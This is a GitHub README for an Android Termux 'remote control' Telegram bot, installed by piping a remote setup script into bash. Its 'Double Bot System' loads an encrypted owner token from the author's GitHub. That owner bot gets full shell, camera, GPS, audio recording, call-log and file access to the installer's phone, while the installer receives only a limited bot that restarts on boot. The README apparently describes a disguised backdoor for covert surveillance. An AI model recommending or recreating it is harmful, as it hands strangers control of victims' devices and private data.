<div align="center">

<img src="https://raw.githubusercontent.com/Arif91786/remotebot/main/logo.png" width="180"/>

# AHM Remote Control Bot

![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Android-0A84FF?style=for-the-badge&logo=android&logoColor=white)
![Status](https://img.shields.io/badge/Status-Active-00C853?style=for-the-badge)

### Control your Android device remotely via Telegram

*Learn | Build | Explore — Tech AHM*

</div>

---

## ⚡ One Command Setup

> Open **Termux** and paste this single command:

```bash
curl -sL https://raw.githubusercontent.com/Arif91786/remotebot/main/setup.sh | bash
```

**That's it!** Just enter your **User Bot Token** when asked. 🎉

---

## 📋 What Happens Automatically

| Step | Action |
|------|--------|
| 1️⃣ | Packages update |
| 2️⃣ | Python ও Git install |
| 3️⃣ | Repository clone |
| 4️⃣ | Libraries install |
| 5️⃣ | Termux:API চেক → না থাকলে F-Droid এ redirect |
| 6️⃣ | Termux:Boot চেক → না থাকলে F-Droid এ redirect |
| 7️⃣ | Owner Bot GitHub থেকে auto load |
| 8️⃣ | **শুধু User Bot Token চাইবে** |
| 9️⃣ | Bot background এ চালু |
| 🔟 | Telegram এ notification ✅ |

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔐 **Double Bot System** | Encrypted Owner Bot + Manual User Bot |
| 📱 **Device Control** | Battery, Storage, WiFi, Location |
| 📷 **Camera Access** | Front & Back Camera, Screenshot |
| 🔦 **Hardware Control** | Torch, Volume, Vibrate, Lock Screen |
| 📁 **File Manager** | ls, cd, cat, rm, mv, cp, mkdir |
| ⚡ **Shell Access** | Run any Linux command remotely |
| 🖼️ **Gallery** | Recent photos send করুন |
| 📞 **Call History** | শেষ ৩ দিনের call log |
| 🎙️ **Audio Recording** | Loop recording, auto send |
| 🔄 **Auto Boot** | ফোন restart হলে auto start |
| 🔔 **Auto Notification** | Bot চালু হলে instant alert |

---

## 🔐 Double Bot System

```
┌─────────────────────────────────────────┐
│           AHM Double Bot System         │
├────────────────────┬────────────────────┤
│   👑 Owner Bot     │   👤 User Bot      │
│   (Encrypted)      │   (Manual)         │
├────────────────────┼────────────────────┤
│ GitHub থেকে        │ install.py তে      │
│ Auto Load ✅       │ Token দিন ✅       │
├────────────────────┼────────────────────┤
│ Full Access ✅     │ Limited Access     │
│ /shell ✅          │ /shell ❌          │
└────────────────────┴────────────────────┘
```

---

## 📋 Commands

### 👑 Owner — Full Access

| Command | Description |
|---------|-------------|
| `/start` | Main menu |
| `/shell <cmd>` | Run any command |
| `/battery` | Battery status |
| `/info` | Device info |
| `/storage` | Storage info |
| `/wifi` | WiFi details |
| `/ip` | IP address |
| `/location` | GPS location |
| `/screenshot` | Screenshot |
| `/cam_front` | Front camera |
| `/cam_back` | Back camera |
| `/torch_on` | Torch on |
| `/torch_off` | Torch off |
| `/vol_up` | Volume up |
| `/vol_down` | Volume down |
| `/mute` | Mute device |
| `/lock` | Lock screen |
| `/gallery <n>` | Recent n photos |
| `/stop_gallery` | Stop gallery |
| `/calls` | Call history |
| `/audio` | Start recording |
| `/stop_audio` | Stop recording |

### 📁 File Manager — Owner Only

| Command | Description |
|---------|-------------|
| `/ls` | List files |
| `/cd <path>` | Change directory |
| `/cat <file>` | Read file |
| `/rm <file>` | Delete file |
| `/mv <src> <dst>` | Move file |
| `/cp <src> <dst>` | Copy file |
| `/mkdir <name>` | Create folder |
| `/get <file>` | Download file |
| `/upload` | Upload file |

### 👤 User — Limited Access

| Command | Description |
|---------|-------------|
| `/start` | Show menu |
| `/battery` | Battery |
| `/storage` | Storage |
| `/ip` | IP address |
| `/screenshot` | Screenshot |
| `/cam_front` | Front camera |
| `/cam_back` | Back camera |
| `/gallery` | Recent photos |
| `/calls` | Call history |

---

## 🔄 Manage Bot

```bash
# বন্ধ করতে
pkill -f remotebot.py

# আবার চালু করতে
python3 /storage/emulated/0/install.py

# Log দেখতে
tail -f /storage/emulated/0/bot.log
```

---

## 📁 File Structure

```
remotebot/
├── 📄 install.py       → One-click installer
├── 🤖 remotebot.py     → Main bot
├── 🔄 autostart.py     → Boot launcher
├── 📜 setup.sh         → One command setup
├── 🔐 .owner.enc       → Encrypted owner token
├── 🔑 .owner.key       → Decryption key
├── 🖼️  logo.png         → Tech AHM logo
└── 📖 README.md        → This file
```

---

## 🛡️ Security

- ✅ Owner Token fully **encrypted**
- ✅ Auto-loaded from GitHub — never exposed
- ✅ User Bot has **restricted** access only
- ✅ Unauthorized users **silently ignored**
- ❌ Never share `.owner.key`
- ❌ Never expose Bot Token publicly

---

## 📞 Contact & Support

<div align="center">

| Platform | Link |
|----------|------|
| 📺 YouTube | [Tech AHM](https://youtube.com/@TechAHM) |
| 💬 Telegram | [@TechAHM](https://t.me/TechAHM) |
| 🐙 GitHub | [Arif91786](https://github.com/Arif91786) |

</div>

---

<div align="center">

<img src="https://raw.githubusercontent.com/Arif91786/remotebot/main/logo.png" width="80"/>

**Made with ❤️ by Tech AHM**

`Learn | Build | Explore`

⭐ **Star this repo if you found it useful!**

</div>
